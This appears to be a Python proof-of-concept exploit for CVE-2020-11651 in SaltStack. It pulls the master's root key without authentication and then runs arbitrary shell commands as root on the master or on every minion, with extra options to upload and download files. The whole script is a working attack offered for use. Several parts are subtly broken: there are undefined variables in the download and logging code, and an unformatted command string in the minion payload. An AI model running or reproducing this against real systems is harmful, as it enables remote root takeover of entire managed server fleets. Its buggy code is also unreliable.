#!/usr/bin/env python3

import argparse
import datetime
import os
import pip
import sys
import warnings

def install(package):
    if hasattr(pip, "main"):
        pip.main(["install", package])
    else:
        pip._internal.main(["install", package])

try:
    import salt
    import salt.version
    import salt.transport.client
    import salt.exceptions
except:
    install("distro")
    install("salt")

def ping(channel): 
    message = {
        "cmd":"ping"
    }
    try:
        response = channel.send(message, timeout=5)
        if response:
            return True 
    except salt.exceptions.SaltReqTimeoutError:
        pass

    return False

def get_rootkey(channel):
    message = {
        "cmd":"_prep_auth_info"
    }
    try:
        response = channel.send(message, timeout=5)
        for i in response:
            if isinstance(i,dict) and len(i) == 1:
                rootkey = list(i.values())[0]
                return rootkey      
    except:
        pass

    return False

def minion(channel, command):
    message = {
        "cmd": "_send_pub",
        "fun": "cmd.run",
        "arg": ["/bin/sh -c \"{command}\""],
        "tgt": "*",
        "ret": "",
        "tgt_type": "glob",
        "user": "root",
        "jid": "{0:%Y%m%d%H%M%S%f}".format(datetime.datetime.utcnow()),
        "_stamp": "{0:%Y-%m-%dT%H:%M:%S.%f}".format(datetime.datetime.utcnow())
    }

    try:
        response = channel.send(message, timeout=5)
        if response == None:
            return True
    except:
        pass
    
    return False

def master(channel, key, command):
    message = { 
        "key": key,
        "cmd": "runner",
        "fun": "salt.cmd",
        "kwarg":{
            "fun": "cmd.exec_code",
            "lang": "python3",
            "code": f"import subprocess;subprocess.call(\"{command}\",shell=True)"
        },
        "user": "root",
        "jid": "{0:%Y%m%d%H%M%S%f}".format(datetime.datetime.utcnow()),
        "_stamp": "{0:%Y-%m-%dT%H:%M:%S.%f}".format(datetime.datetime.utcnow())
    }

    try:
        response = channel.send(message, timeout=5)
        log("[ ] Response: " + str(response))
    except:
        return False

def download(channel, key, src, dest):
    message = {
        "key": key,
        "cmd": "wheel",
        "fun": "file_roots.read",
        "path": path,
        "saltenv": "base",
    }

    try:
        response = channel.send(message, timeout=5)
        data = response["data"]["return"][0][path]

        with open(dest, "wb") as o:
            o.write(data)
        return True
    except:
        return False

def upload(channel, key, src, dest):
    try:
        with open(src, "rb") as s:
            data = s.read()
    except Exception as e:
        print(f"[ ] Failed to read {src}: {e}")
        return False

    message = {
        "key": key,
        "cmd": "wheel",
        "fun": "file_roots.write",
        "saltenv": "base",
        "data": data,
        "path": dest,
    }

    try:
        response = channel.send(message, timeout=5)
        return True
    except:
        return False
    
def log(message):
    if not args.quiet:
        print(message)

if __name__=="__main__":
    warnings.filterwarnings("ignore")

    desc = "CVE-2020-11651 PoC" 

    parser = argparse.ArgumentParser(description=desc)

    parser.add_argument("--host", "-t", dest="master_host", metavar=('HOST'), required=True)
    parser.add_argument("--port", "-p", dest="master_port", metavar=('PORT'), default="4506", required=False)
    parser.add_argument("--execute", "-e", dest="command", default="/bin/sh", help="Command to execute. Defaul: /bin/sh", required=False)
    parser.add_argument("--upload", "-u", dest="upload", nargs=2, metavar=('src', 'dest'), help="Upload a file", required=False)
    parser.add_argument("--download", "-d", dest="download", nargs=2, metavar=('src', 'dest'), help="Download a file", required=False)
    parser.add_argument("--minions", dest="minions", default=False, action="store_true", help="Send command to all minions on master",required=False)
    parser.add_argument("--quiet", "-q", dest="quiet", default=False, action="store_true", help="Enable quiet/silent mode", required=False)
    parser.add_argument("--fetch-key-only", dest="fetchkeyonly", default=False, action="store_true", help="Only fetch the key", required=False)

    args = parser.parse_args()

    minion_config = {
        "transport": "zeromq",
        "pki_dir": "/tmp",
        "id": "root",
        "log_level": "debug",
        "master_ip": args.master_host,
        "master_port": args.master_port,
        "auth_timeout": 5,
        "auth_tries": 1,
        "master_uri": f"tcp://{args.master_host}:{args.master_port}"
    }
    
    clear_channel = salt.transport.client.ReqChannel.factory(minion_config, crypt="clear")

    log(f"[+] Attempting to ping {args.master_host}")
    if not ping(clear_channel):
        log("[-] Failed to ping the master")
        log("[+] Exit")
        sys.exit(1)


    log("[+] Attempting to fetch the root key from the instance.")
    rootkey = get_rootkey(clear_channel)
    if not rootkey:
        log("[-] Failed to fetch the root key from the instance.")
        sys.exit(1)
    
    log("[+] Retrieved root key: " + rootkey)
    
    if args.fetchkeyonly:
        sys.exit(1)

    if args.upload:
        log(f"[+] Attemping to upload {src} to {dest}")
        if upload(clear_channel, rootkey,  args.upload[0], args.upload[1]):
            log("[+] Upload done!")
        else:
            log("[-] Failed")
         
    if args.download:
        log(f"[+] Attemping to download {src} to {dest}")
        if download(clear_channel, rootkey,  args.download[0], args.download[1]):
            log("[+] Download done!")
        else:
            log("[-] Failed")

    if args.minions:
        log("[+] Attempting to send command to all minions on master")
        if not minion(clear_channel, command):
            log("[-] Failed")
    else:
        log("[+] Attempting to send command to master")
        if not master(clear_channel, rootkey, command):
            log("[-] Failed")
    